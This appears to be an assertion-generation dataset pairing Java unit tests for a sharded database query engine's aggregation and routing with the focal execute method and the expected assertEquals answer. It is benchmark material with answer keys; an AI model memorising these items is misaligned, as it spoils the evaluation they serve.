"SQLException { VtResultSet input = TestResult.makeTestResult(TestResult.makeTestFields(""col1|col2|count(*)"", ""varbinary|decimal|int64""), // Two identical values ""a|1|1"", ""a|1|2"", // Single value ""b|1|1"", // Two different values ""c|3|1"", ""c|4|1"", // Single null ""d|null|1"", // Start with null ""e|null|1"", ""e|1|1"", // Null comes after first ""f|1|1"", ""f|null|1"", // Identical to non-identical transition ""g|1|1"", ""g|1|1"", ""g|2|1"", ""g|3|1"", // Non-identical to identical transition ""h|1|1"", ""h|2|1"", ""h|2|1"", ""h|3|1"", // Key transition, should still count 3 ""i|3|1"", ""i|4|1""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(input));  AbstractAggregateGen4.AggregateParams aggr1 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateCountDistinct, 1, ""count(distinct col2)""); AbstractAggregateGen4.AggregateParams aggr2 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSum, 2); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(true, Lists.newArrayList(aggr1, aggr2), false, 0, Lists.newArrayList(groupByParams), null, fp); VtResultSet result = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList();  VtResultSet wantResult = TestResult.makeTestResult(TestResult.makeTestFields(""col1|count(distinct col2)|count(*)"", ""varbinary|int64|int64""), ""a|1|3"", ""b|1|1"", ""c|2|2"", ""d|0|1"", ""e|1|2"", ""f|1|2"", ""g|3|4"", ""h|3|4"", ""i|2|2"");  Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(wantResult, result)
"SQLException { VtResultSet input = TestResult.makeTestResult(TestResult.makeTestFields(""col1|col2|sum(col3)"", ""varbinary|int64|decimal""), // Two identical values ""a|1|1"", ""a|1|2"", // Single value ""b|1|1"", // Two different values ""c|3|1"", ""c|4|1"", // Single null ""d|null|1"", ""d|1|1"", // Start with null ""e|null|1"", ""e|1|1"", // Null comes after first ""f|1|1"", ""f|null|1"", // Identical to non-identical transition ""g|1|1"", ""g|1|1"", ""g|2|1"", ""g|3|1"", // Non-identical to identical transition ""h|1|1"", ""h|2|1"", ""h|2|1"", ""h|3|1"", // Key transition, should still count 3 ""i|3|1"", ""i|4|1""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(input));  AbstractAggregateGen4.AggregateParams aggr1 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSumDistinct, 1, ""sum(distinct col2)""); AbstractAggregateGen4.AggregateParams aggr2 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSum, 2); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(true, Lists.newArrayList(aggr1, aggr2), false, 0, Lists.newArrayList(groupByParams), null, fp); VtResultSet result = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList();  VtResultSet wantResult = TestResult.makeTestResult(TestResult.makeTestFields(""col1|sum(distinct col2)|sum(col3)"", ""varbinary|decimal|decimal""), ""a|1|3"", ""b|1|1"", ""c|7|2"", ""d|1|2"", ""e|1|2"", ""f|1|2"", ""g|6|4"", ""h|6|4"", ""i|7|2""); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(wantResult, result)
"SQLException { VtResultSet input = TestResult.makeTestResult(TestResult.makeTestFields(""col1|col2"", ""varbinary|varbinary""), ""a|aaa"", ""a|0"", ""a|1""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(input));  AbstractAggregateGen4.AggregateParams aggr1 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSumDistinct, 1, ""sum(distinct col2)""); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(true, Lists.newArrayList(aggr1), false, 0, Lists.newArrayList(groupByParams), null, fp); VtResultSet result = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList();  VtResultSet wantResult = TestResult.makeTestResult(TestResult.makeTestFields(""col1|sum(distinct col2)"", ""varbinary|decimal""), ""a|1""); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(wantResult, result)
"SQLException { VtResultSet input = TestResult.makeTestResult(TestResult.makeTestFields(""col|count(*)"", ""varbinary|decimal""), ""a|1"", ""a|0""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(input));  AbstractAggregateGen4.AggregateParams aggr1 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSum, 1); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(false, Lists.newArrayList(aggr1), false, 0, Lists.newArrayList(groupByParams), null, fp);  Query.Field field1 = Query.Field.newBuilder().setName(""col"").setType(Query.Type.VARBINARY).build(); Query.Field field2 = Query.Field.newBuilder().setName(""count(*)"").setType(Query.Type.DECIMAL).build();  VtResultValue value1 = new VtResultValue(""a"", Query.Type.VARBINARY); VtResultValue value2 = new VtResultValue(BigDecimal.valueOf(1), Query.Type.DECIMAL); List<VtResultValue> vtResultValues = Lists.newArrayList(value1, value2); List<List<VtResultValue>> rows = new ArrayList<>(); rows.add(vtResultValues); VtResultSet result = new VtResultSet(new Query.Field[] {field1, field2}, rows);  VtResultSet res = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList();  Assert.""<AssertPlaceHolder>"";  fp.rewind(); }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(result, res)
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""c1|c2|weight_string(c2)"", ""int64|varchar|varbinary""); VtResultSet r = TestResult.makeTestResult(fields, ""10|a|0x41"", ""10|a|0x41"", ""10|b|0x42"", ""20|b|0x42""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(r));  AbstractAggregateGen4.AggregateParams aggr1 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateCountDistinct, 1, ""count(distinct c2)""); aggr1.setWCol(2); aggr1.setWAssigned(true); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(true, Lists.newArrayList(aggr1), false, 2, Lists.newArrayList(groupByParams), null, fp);  VtResultSet want = TestResult.makeTestResult(TestResult.makeTestFields(""c1|count(distinct c2)"", ""int64|int64""), ""10|2"", ""20|1"");  VtResultSet qr = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList(); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(want, qr)
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""c1|c2|weight_string(c2)"", ""int64|varchar|varbinary""); VtResultSet r = TestResult.makeTestResult(fields, ""null|null|null"", ""null|a|0x41"", ""null|b|0x42"", ""10|null|null"", ""10|null|null"", ""10|a|0x41"", ""10|a|0x41"", ""10|b|0x42"", ""20|null|null"", ""20|b|0x42"", ""30|null|null"", ""30|null|null"", ""30|null|null"", ""30|null|null""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(r));  AbstractAggregateGen4.AggregateParams aggr1 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateCountDistinct, 1, ""count(distinct c2)""); aggr1.setWCol(2); aggr1.setWAssigned(true); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(true, Lists.newArrayList(aggr1), false, 2, Lists.newArrayList(groupByParams), null, fp);  VtResultSet want = TestResult.makeTestResult(TestResult.makeTestFields(""c1|count(distinct c2)"", ""int64|int64""), ""null|2"", ""10|2"", ""20|1"", ""30|0"");  VtResultSet qr = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList(); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(want, qr)
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""c1|c2|c3"", ""int64|int64|int64""); VtResultSet r = TestResult.makeTestResult(fields, ""null|null|null"", ""null|1|2"", ""null|2|2"", ""10|null|null"", ""10|2|null"", ""10|2|1"", ""10|2|3"", ""10|3|3"", ""20|null|null"", ""20|null|null"", ""30|1|1"", ""30|1|2"", ""30|1|3"", ""40|1|1"", ""40|2|1"", ""40|3|1""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(r));  AbstractAggregateGen4.AggregateParams aggr1 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateCountDistinct, 1, ""count(distinct c2)""); AbstractAggregateGen4.AggregateParams aggr2 = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSumDistinct, 2, ""sum(distinct c3)""); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(true, Lists.newArrayList(aggr1, aggr2), false, 0, Lists.newArrayList(groupByParams), null, fp);  VtResultSet want = TestResult.makeTestResult(TestResult.makeTestFields(""c1|count(distinct c2)|sum(distinct c3)"", ""int64|int64|decimal""), ""null|2|2"", ""10|2|4"", ""20|0|null"", ""30|1|6"", ""40|3|1""); VtResultSet qr = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList(); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(want, qr)
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectUnsharded, new VKeyspace(""ks"", false), ""select"", ""select_field"", new MySqlSelectQueryBlock()); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""0""), Lists.newArrayList(defaultSelectResult)); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, new HashMap<>(), false); List<String> wants = Lists.newArrayList(""ResolveDestinations ks [] Destinations:DestinationAllShard()"", ""ExecuteMultiShard ks.0: select {} false false""); vc.expectLog(wants); Assert.""<AssertPlaceHolder>"";  //        vc.Rewind() //        result, err = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) //        require.NoError(t, err) //        vc.ExpectLog(t, []string{ //      `ResolveDestinations ks [] Destinations:DestinationAllShards()`, //      `StreamExecuteMulti dummy_select ks.0: {} `, //        }) //        expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult) }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail(""testSelectUnsharded is FAIL""), result.getVtRowList(), defaultSelectResult)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectScatter, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(defaultSelectResult)); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, null, false); List<String> wants = Lists.newArrayList(""ResolveDestinations ks [] Destinations:DestinationAllShard()"", ""ExecuteMultiShard ks.-20: select {} ks.20-: select {} false false""); vc.expectLog(wants); Assert.""<AssertPlaceHolder>"";  //流式查询 //        vc.Rewind() //        result, err = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) //        require.NoError(t, err) //        vc.ExpectLog(t, []string{ //      `ResolveDestinations ks [] Destinations:DestinationAllShards()`, //      `StreamExecuteMulti dummy_select ks.-20: {} ks.20-: {} `, //        }) //        expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult) }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testSelectScatter is FAIL""), result.getVtRowList(), defaultSelectResult)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectEqualUnique, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.getRoutingParameters().setVindex(new BinaryHash()); sel.getRoutingParameters().setValues(Lists.newArrayList(EvalEngine.newLiteralInt(1L)));  LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(defaultSelectResult)); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, null, false); List<String> wants = Lists.newArrayList(""ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6)"", ""ExecuteMultiShard ks.-20: select {} false false""); vc.expectLog(wants); Assert.""<AssertPlaceHolder>""; //流式查询 /* vc.Rewind() result, err = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) require.NoError(t, err) vc.ExpectLog(t, []string{ `ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6)`, `StreamExecuteMulti dummy_select ks.-20: {} `, }) expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult)  */ }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testSelectEqualUniqueScatter is FAIL""), defaultSelectResult, result.getVtRowList())"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectEqualUnique, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.getRoutingParameters().setVindex(new BinaryHash()); sel.getRoutingParameters().setValues(Lists.newArrayList(EvalEngine.newLiteralInt(1L))); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(defaultSelectResult)); vc.setShardForKsid(Lists.newArrayList(""-20"", ""20-"")); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, null, false); vc.expectLog( Lists.newArrayList(""ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6)"", ""ExecuteMultiShard ks.-20: select {} false false"") ); Assert.""<AssertPlaceHolder>"";  //        vc.Rewind() //        result, err = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) //        require.NoError(t, err) //        vc.ExpectLog(t, []string{ //      `ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyRange(-)`, //      `StreamExecuteMulti dummy_select ks.-20: {} ks.20-: {} `, //        }) //        expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult) }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testSelectEqualUniqueScatter is FAIL""), result.getVtRowList(), defaultSelectResult)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectEqual, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.getRoutingParameters().setVindex(new BinaryHash()); sel.getRoutingParameters().setValues(Lists.newArrayList(EvalEngine.newLiteralInt(1L))); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(defaultSelectResult)); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, null, false); vc.expectLog( Lists.newArrayList(""ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6)"", ""ExecuteMultiShard ks.-20: select {} false false"") ); Assert.""<AssertPlaceHolder>"";  //        vc.Rewind() //        result, err = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) //        require.NoError(t, err) //        vc.ExpectLog(t, []string{ //      `ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyRange(-)`, //      `StreamExecuteMulti dummy_select ks.-20: {} ks.20-: {} `, //        }) //        expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult) }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" TestSelectEqual is FAIL""), result.getVtRowList(), defaultSelectResult)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectEqual, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.getRoutingParameters().setVindex(new BinaryHash()); sel.getRoutingParameters().setValues(Lists.newArrayList(EvalEngine.newLiteralInt(1L))); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), null); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, null, false); vc.expectLog( Lists.newArrayList(""ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6)"", ""ExecuteMultiShard ks.-20: select {} false false"") ); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testSelectEqualNoRoute is FAIL""), result.getVtRowList(), new VtResultSet())"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectIN, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.getRoutingParameters().setVindex(new BinaryHash()); sel.getRoutingParameters() .setValues(Lists.newArrayList(new EvalEngine.TupleExpr(Lists.newArrayList(EvalEngine.newLiteralInt(1L), EvalEngine.newLiteralInt(2L), EvalEngine.newLiteralInt(4L))))); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(defaultSelectResult)); vc.setShardForKsid(Lists.newArrayList(""-20"", ""-20"", ""20-"")); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, new HashMap<>(), false); vc.expectLog(Lists.newArrayList( ""ResolveDestinations ks [type:INT64 value:""1"" type:INT64 value:""2"" type:INT64 value:""4""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6),DestinationKeyspaceID(06e7ea22ce92708f),DestinationKeyspaceID(d2fd8867d50d2dfe)"", ""ExecuteMultiShard ks.-20: select {__vals: type:TUPLE, values:[type:INT64 value:""1"" type:INT64 value:""2""]} ks.20-: select {__vals: type:TUPLE, values:[type:INT64 value:""4""]} false false"")); Assert.""<AssertPlaceHolder>"";  //        vc.Rewind() //        result, err = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) //        require.NoError(t, err) //        vc.ExpectLog(t, []string{ //      `ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyRange(-)`, //      `StreamExecuteMulti dummy_select ks.-20: {} ks.20-: {} `, //        }) //        expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult) }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testINUnique is FAIL""), result.getVtRowList(), defaultSelectResult)"
